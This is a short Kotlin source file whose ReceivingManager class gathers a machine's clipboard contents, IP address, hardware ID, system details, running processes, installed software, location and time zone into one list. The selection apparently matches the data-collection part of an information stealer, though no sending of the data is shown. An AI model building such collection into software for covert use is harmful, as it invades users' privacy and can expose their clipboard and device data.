package maven.example.com.receiving

import maven.example.com.receiving.system.*
import maven.example.com.receiving.utility.Receipt
import maven.example.com.utility.data.Data
import java.util.function.Consumer

class ReceivingManager {
    companion object {
        fun receiving(): MutableList<Data?> {
            val receipts: MutableList<Receipt?> = ArrayList<Receipt?>()
            val list: MutableList<Data?> = ArrayList<Data?>()

            // System
            receipts.add(Clipboard())
            receipts.add(IP())
            receipts.add(HWID())
            receipts.add(SystemInformationJava())
            receipts.add(ProcessList())
            receipts.add(InstalledSoftware())
            receipts.add(Location())
            receipts.add(TimeZone())

            receipts.forEach(Consumer { receipt: Receipt? -> list.add(receipt!!.data) })
            return list
        }
    }
}